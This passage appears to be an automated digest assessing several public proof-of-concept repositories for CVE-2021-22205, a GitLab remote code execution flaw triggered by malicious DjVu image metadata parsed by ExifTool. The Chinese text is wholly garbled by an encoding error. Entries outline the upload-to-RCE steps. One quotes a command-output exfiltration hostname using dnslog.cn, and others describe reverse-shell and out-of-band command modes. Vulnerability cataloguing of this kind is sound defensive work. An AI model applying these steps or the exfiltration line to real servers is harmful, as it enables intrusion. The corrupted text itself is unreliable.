**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
